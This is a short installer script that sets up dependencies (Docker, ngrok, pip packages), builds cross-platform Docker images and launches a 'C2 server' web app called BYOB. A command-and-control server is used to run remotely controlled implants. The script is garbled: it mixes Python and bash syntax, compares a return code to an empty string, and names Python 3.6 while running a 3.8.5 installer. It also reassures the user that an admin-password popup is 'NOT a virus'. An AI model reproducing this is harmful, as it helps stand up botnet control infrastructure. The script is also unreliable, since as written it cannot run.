import os
import urllib.request
import time

print("Running BYOB app startup...")

# Install Python if necessary
status = os.system("which python3")

if status == "":
	print("Installing Python 3.6...")
  print("In 5 secconds there will be a popup asking for you to put in an admin password. This is the python install exe running. This is NOT a virus the hashes for this file are in 'hashes.txt'.")
	time.sleep(5)
  os.system("python-3.8.5-amd64.exe")
else
	echo "Confirmed Python is installed."
fi

# Install Docker if necessary
which docker > /dev/null
status=$?

if test $status -ne 0
then
	echo "Installing Docker..."
	apt-get install docker.io -y
else
	echo "Confirmed Docker is installed."
fi

# Install Python packages
echo "Installing Python packages..."
python3 -m pip install -r requirements.txt
apt-get install snapd -y
snap install ngrok
# Build Docker images
echo "Building Docker images - this will take a while, please be patient..."
cd docker-pyinstaller1
docker build -f Dockerfile-py3-amd64 -t nix-amd64 .
docker build -f Dockerfile-py3-i386 -t nix-i386 .
docker build -f Dockerfile-py3-win32 -t win-x32 .

# Run app
cd ..
echo "Running C2 server with locally hosted web app GUI..."
echo "Navigate to http://127.0.0.1:5000 and set up your user to get started."
python3 run.py
